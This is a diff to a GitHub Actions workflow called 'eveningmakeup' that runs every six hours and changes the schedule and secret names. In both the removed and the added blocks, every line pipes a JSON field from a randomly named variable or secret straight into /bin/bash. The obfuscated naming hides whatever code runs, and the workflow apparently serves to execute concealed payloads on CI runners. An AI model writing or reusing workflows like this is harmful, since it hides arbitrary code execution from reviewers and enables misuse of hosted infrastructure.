@@ -1,8 +1,9 @@
 name: eveningmakeup
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 5/6 * * *'
+    - cron: '12 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,22 +12,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: eveningmakeup
         env:
-          dsjfh9616: ${{ secrets.dsjfh9616 }}
+          w3959: ${{ secrets.w3959 }}
         run: |
-          echo $dsjfh9616 | jq -r .uiyfs44790 | /bin/bash
-          echo $uy62927 | jq -r .wt810 | /bin/bash
-          echo $rqs667 | jq -r .agprz9 | /bin/bash
-          echo $k8587 | jq -r .byxp9 | /bin/bash
-          echo $wm98 | jq -r .g94 | /bin/bash
-          echo $d1234 | jq -r .l06 | /bin/bash
-          echo $e930 | jq -r .bww218 | /bin/bash
-          echo $u97 | jq -r .nmgd022 | /bin/bash
-          echo $t6 | jq -r .porfl559 | /bin/bash
-          echo $k06 | jq -r .wlbn262 | /bin/bash
-          echo $qsyg3176 | jq -r .gytma086 | /bin/bash
-          echo $cprii0354 | jq -r .a95 | /bin/bash
-          echo $ho019 | jq -r .lr18 | /bin/bash
-          echo $rrtw44252 | jq -r .lsny1 | /bin/bash
-          echo $yug2 | jq -r .wwxym20825 | /bin/bash
-          echo $vyfyh76 | jq -r .ciucz71 | /bin/bash
+          echo $w3959 | jq -r .w0 | /bin/bash
+          echo $mke5 | jq -r .qdv247 | /bin/bash
+          echo $tm034 | jq -r .xnoba981 | /bin/bash
+          echo $hies11610 | jq -r .t8144 | /bin/bash
+          echo $lmk485 | jq -r .ymgse04 | /bin/bash
+          echo $j8580 | jq -r .r281 | /bin/bash
+          echo $l6034 | jq -r .ypif2 | /bin/bash
+          echo $cmzgg72 | jq -r .pc0 | /bin/bash
+          echo $rg98 | jq -r .pk192 | /bin/bash
+          echo $uugh807 | jq -r .ay035 | /bin/bash
+          echo $xtp3262 | jq -r .jjd7 | /bin/bash
+          echo $vit05 | jq -r .zdf8350 | /bin/bash
+          echo $awvn7 | jq -r .no01 | /bin/bash
 
